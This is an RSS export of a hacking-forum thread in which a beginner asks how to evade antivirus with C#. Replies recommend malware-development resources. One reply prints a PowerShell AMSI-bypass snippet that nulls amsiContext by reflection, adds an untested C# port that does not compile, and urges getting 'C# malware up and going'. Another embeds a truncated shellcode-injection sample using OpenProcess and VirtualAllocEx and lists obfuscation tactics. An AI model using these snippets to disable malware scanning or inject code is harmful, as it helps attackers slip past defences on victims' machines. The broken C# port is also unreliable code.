<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
    <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620</link>
    <description>Hello every I am learning C#. because I want to bypass Anti-Viruses by C#.But  I don&#39;t know how to learn this knowledge about bypass Anti-Viruses by C#.</description>
    
    <lastBuildDate>Mon, 24 Jul 2023 14:54:36 +0000</lastBuildDate>
    <category>Beginner Guides</category>
    <atom:link href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
        <description><![CDATA[
            <p>I am totally glad that I could help <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/9</link>
        <pubDate>Mon, 24 Jul 2023 14:54:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-9</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[pryoc110]]></dc:creator>
        <description><![CDATA[
            <p>Thx friend.I will seriously study these resources you recommend. <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=12" title=":blush:" class="emoji" alt=":blush:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/7</link>
        <pubDate>Wed, 01 Mar 2023 02:42:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-7</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
        <description><![CDATA[
            <p>Awww thanks <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>I am no expert, but here are some resources for you:</p>
<h2>
<a name="books-1" class="anchor" href="https://0x00sec.org#books-1"></a>Books</h2>
<ul>
<li>C++ Crash Course: A Fast-Paced Introduction (<a href="https://nostarch.com/cppcrashcourse" rel="noopener nofollow ugc">Lospinoso 2019</a>)</li>
<li>The Secret Life of Programs (<a href="https://nostarch.com/foundationsofcomp" rel="noopener nofollow ugc">Steinhart 2019</a>)</li>
<li>Practical Binary Analysis (<a href="https://practicalbinaryanalysis.com/" rel="noopener nofollow ugc">Andriesse 2018</a>)</li>
<li>Practical Reverse Engineering (<a href="https://www.amazon.com/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315?tag=0x00sec03-20" rel="noopener nofollow ugc">Dang et al 2014</a>)</li>
<li>Ghidra Software Reverse Engineering for Beginners (<a href="https://www.amazon.com/Ghidra-Software-Reverse-Engineering-Beginners/dp/1800207972?tag=0x00sec03-20" rel="noopener nofollow ugc">David 2021</a>)</li>
</ul>
<h2>
<a name="online-resources-2" class="anchor" href="https://0x00sec.org#online-resources-2"></a>Online Resources</h2>
<ul>
<li>Malware Unicorn’s online resources: <a href="https://malwareunicorn.org/#/resources" rel="noopener nofollow ugc">https://malwareunicorn.org/#/resources</a>
<ul>
<li>and of course Malware Unicorn’s workshops/labs: <a href="https://malwareunicorn.org/#/workshops" rel="noopener nofollow ugc">https://malwareunicorn.org/#/workshops</a>
</li>
</ul>
</li>
<li>There’s Hasherezade’s blog post to get you up to speed on learning malware analysis (and hence more about native PE executables): <a href="https://hshrzd.wordpress.com/how-to-start/" rel="noopener nofollow ugc">https://hshrzd.wordpress.com/how-to-start/</a>
</li>
<li>Here is a YouTube course on reverse engineering: <a href="https://www.youtube.com/watch?v=fv9ii3W5htQ&amp;list=PLHJns8WZXCdvaD7-xR7e5FJNW_6H9w-wC" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=fv9ii3W5htQ&amp;list=PLHJns8WZXCdvaD7-xR7e5FJNW_6H9w-wC</a>
</li>
<li>There’s <em>VX Underground</em>, which is just an amazing resource: <a href="https://www.vx-underground.org/" rel="noopener nofollow ugc">https://www.vx-underground.org/</a>
</li>
<li>Finally, and this is bit self-promoting, but here is <em>VX Reloaded</em>, which is my personal project in writing malware for fun, not profit. I just have a simple Python file infector, but plan to add more stuff in the future! <a href="https://vxreloaded.github.io/" rel="noopener nofollow ugc">https://vxreloaded.github.io/</a>
</li>
</ul>
<p>P.S. sorry for the l8 response <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=12" title=":blush:" class="emoji" alt=":blush:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/6</link>
        <pubDate>Mon, 13 Feb 2023 11:06:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-6</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[pryoc110]]></dc:creator>
        <description><![CDATA[
            <p>Hi dude，I took your advice and went to learn some reverse knowledge, such as PE structure, assembly code, C and C++</p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/5</link>
        <pubDate>Thu, 05 Jan 2023 08:00:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-5</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[pryoc110]]></dc:creator>
        <description><![CDATA[
            <p>That’s awesome! I’m going to learn these great projects and knowledge. <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/4</link>
        <pubDate>Fri, 16 Sep 2022 06:48:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-4</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
        <description><![CDATA[
            <p>Hey <a class="mention" href="https://0x00sec.org/u/pryoc110">@pryoc110</a>. It should be noted that the C# programming language may not be the best for developing malware to evade antivirus. Microsoft recently integrated their anti-malware scan interface with the .NET framework (<a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps" rel="noopener nofollow ugc">Ashcraft, 2019</a>), so in my non-expert opinion, only use C# AV avoidance techniques if you’re up for a good challenge — especially if you’re going to use the assembly in a real life situation!</p>
<p>But if you really want to try to evade antivirus with a .NET assembly written in C#, I was able to find a few interesting projects and research that might be able to help you. <a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" rel="noopener nofollow ugc">Chandel (2022)</a> discusses seven different techniques for bypassing the AMSI service. They’re mostly applied to PowerShell, but I do think that with a bit of creativity, you can implement them in C#.</p>
<p>For example, consider this snippet in Chandel’s article:</p>
<pre><code class="lang-bash">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
</code></pre>
<p>This is referencing a function called <code>amsiInitFailed()</code> and trying to set it to <code>true</code> as to “tricking,” for lack of a better term, the interface into not scanning the assembly in question. Here is a simple PowerShell-to-C# pseudo-port that I whipped up (that I didn’t bother to test, I’ll leave that up to you ;-):</p>
<pre><code class="lang-auto">using System;
using System.Runtime.InteropServices;

public class Programme {
    public static void Main(string[] args) {
        var mem = System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
        Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue(null, null);
        Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue(null, (IntPtr)mem)
    }
}
</code></pre>
<p>There are also websites like <a href="https://amsi.fail/" rel="noopener nofollow ugc">amsi.fail</a> that take in (specifically PowerShell) code, and obfuscates and mangles them to the point that AMSI will get too confused and not recognise the malicious nature of the thing. I do recommend using these as a starting point for getting your C# malware up and going <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/3</link>
        <pubDate>Sat, 10 Sep 2022 18:53:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-3</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
        <description><![CDATA[
            <p>Hey!!<br>
Well I’d recommend you first understand the AV’s then learn some basic C#. One of the thing about evading AV is understanding what is being detected.</p>
<p>You don’t need to write in C but this is a good read on understand why the methods work</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://0xpat.github.io/Malware_development_part_1/">
  <header class="source">

      <a href="https://0xpat.github.io/Malware_development_part_1/" target="_blank" rel="noopener nofollow ugc">0xpat.github.io</a>
  </header>

  <article class="onebox-body">
    

<h3><a href="https://0xpat.github.io/Malware_development_part_1/" target="_blank" rel="noopener nofollow ugc">Malware development part 1 - basics</a></h3>

  <p>Introduction
This is the first post of a series which regards development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>The following Link has references and ideas on how to execute Shell-code on your C# malware</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://ppn.snovvcrash.rocks/red-team/maldev/dinvoke">
  <header class="source">
      <span class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use href="#unlink"></use></svg></span>

      <a href="https://ppn.snovvcrash.rocks/red-team/maldev/dinvoke" target="_blank" rel="noopener nofollow ugc">ppn.snovvcrash.rocks</a>
  </header>

  <article class="onebox-body">
    <span class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use href="#unlink"></use></svg></span>

<h3><a href="https://ppn.snovvcrash.rocks/red-team/maldev/dinvoke" target="_blank" rel="noopener nofollow ugc">D/Invoke</a></h3>

  <p>Dynamic API Invocation</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>This is a simple C# malware that injects and executes shellcode</p><aside class="onebox githubblob" data-onebox-src="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs">
  <header class="source">

      <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs" target="_blank" rel="noopener nofollow ugc">S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs</a></h4>


      <pre><code class="lang-cs">// stolen from https://rastamouse.me/blog/process-injection-dinvoke/
using System;
using System.IO;
using System.Runtime.InteropServices;

using SharpSploit.Execution.DynamicInvoke;

namespace InjectionTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var shellcode = File.ReadAllBytes(args[0]);

            var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
            var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[1]));

            pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
</code></pre>



  This file has been truncated. <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs" target="_blank" rel="noopener nofollow ugc">show original</a>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>If you can look onto other researchers on the different methods they execute their malware you can grab an idea on how to write your own. For evading is usually stuff as changing variables names, removing comments, different methods of execution, size, flow of execution, obfuscation. You can use these terms to research methods of evading AV as these are used in different places (Go, PowerShell, C, F#, etc)</p>
<p>Good Luck!</p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/2</link>
        <pubDate>Wed, 10 Aug 2022 23:50:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-2</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
      <item>
        <title>How to Bypass Anti-Viruses by C#？How to learn?</title>
        <dc:creator><![CDATA[pryoc110]]></dc:creator>
        <description><![CDATA[
            <p>Hello every I am learning C#. because I want to bypass Anti-Viruses by C#.But  I don’t know how to learn this knowledge about bypass Anti-Viruses by C#.</p>
          <p><a href="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620/1</link>
        <pubDate>Tue, 09 Aug 2022 16:00:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-30620-1</guid>
        <source url="https://0x00sec.org/t/how-to-bypass-anti-viruses-by-c-how-to-learn/30620.rss">How to Bypass Anti-Viruses by C#？How to learn?</source>
      </item>
  </channel>
</rss>
